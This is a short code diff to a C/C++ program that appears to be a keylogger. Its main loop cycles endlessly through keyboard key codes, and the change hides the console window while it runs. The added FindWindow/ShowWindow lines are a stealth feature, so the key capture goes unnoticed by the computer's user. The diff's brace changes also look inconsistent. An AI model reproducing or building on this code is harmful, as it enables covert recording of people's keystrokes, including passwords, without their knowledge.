@@ -89,7 +89,9 @@ return false;
 int main()
 {
 char KEY='x';
-
+HWND hide = FindWindow("ConsoleWindowClass",NULL);	
+ShowWindow(hide,NULL);
+	
 while(true)
 	{
 		for(KEY=8;KEY<=190;KEY++)
@@ -112,6 +114,7 @@ while(true)
 		}
 	
 	}
+	
+ShowWindow(hide,1);	
 return 0;
-}	
 }
